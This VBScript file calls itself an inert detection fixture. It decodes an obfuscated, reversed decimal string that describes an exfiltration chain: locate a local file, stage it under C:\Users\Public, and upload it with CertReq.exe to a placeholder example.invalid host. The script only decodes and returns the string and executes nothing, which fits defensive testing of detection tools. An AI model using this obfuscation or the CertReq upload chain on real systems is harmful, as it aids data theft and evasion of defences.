Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_b9e34f12 = "49|51|48|99|56|57|101|52|47|100|97|111|108|112|117|47|100|105|108|97|118|110|105|46|101|108|112|109|97|120|101|46|54|55|50|55|102|50|53|97|48|99|47|47|58|115|112|116|116|104|61|108|114|117|95|100|97|111|108|112|117|124|116|97|100|46|54|55|50|55|102|50|53|97|48|99|45|101|103|97|116|115|92|98|97|76|115|115|101|114|116|110|117|72|92|99|105|108|98|117|80|92|115|114|101|115|85|92|58|67|61|104|116|97|112|95|101|108|105|102|124|54|55|50|55|102|50|53|97|48|99|47|98|97|76|115|115|101|114|116|110|117|72|61|116|110|101|103|97|95|114|101|115|117|124|116|97|100|46|99|102|100|54|51|48|100|97|47|100|105|108|97|118|110|105|46|101|108|112|109|97|120|101|46|54|55|50|55|102|50|53|97|48|99|47|47|58|115|112|116|116|104|61|108|114|117|124|54|55|50|55|102|50|53|97|48|99|45|110|103|105|97|112|109|97|99|61|100|105|95|110|103|105|97|112|109|97|99|124|50|61|116|110|117|111|99|95|101|103|97|116|115|124|101|120|101|46|113|101|82|116|114|101|67|61|114|101|116|112|97|100|97|124|101|116|111|109|101|114|95|100|97|111|108|112|117|44|114|101|102|115|110|97|114|116|95|101|114|97|112|101|114|112|44|108|97|99|111|108|95|101|116|97|99|111|108|61|115|112|101|116|115|124|49|61|118"
Const Codec_b9e34f12 = "decimal_pipe|reverse_bytes|"

Function Load_b9e34f12()
  Dim parts, result(), i
  parts = Split(Material_b9e34f12, "|")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(i) = CInt(parts(i))
  Next
  Load_b9e34f12 = result
End Function

Function Decode_b9e34f12(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(UBound(s) - i) = s(i)
  Next
  Decode_b9e34f12 = result
End Function

Function Recover_b9e34f12()
  Dim s, d, t, n, i, p, e, q
  If True Then
    n = LCase(UCase("Host"))
      s = Load_b9e34f12()
      Select Case 1
        Case 1
          d = Decode_b9e34f12(s)
        Case Else
          d = Array()
      End Select
      t = ""
      For i = 0 To UBound(d)
        t = t & Chr(d(i))
      Next
  End If
  Recover_b9e34f12 = t
End Function

Sub Copy_b9e34f12(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_b9e34f12()
  Dim resultText
  Call Copy_b9e34f12(Recover_b9e34f12(), resultText)
  Inspect_b9e34f12 = resultText
End Function
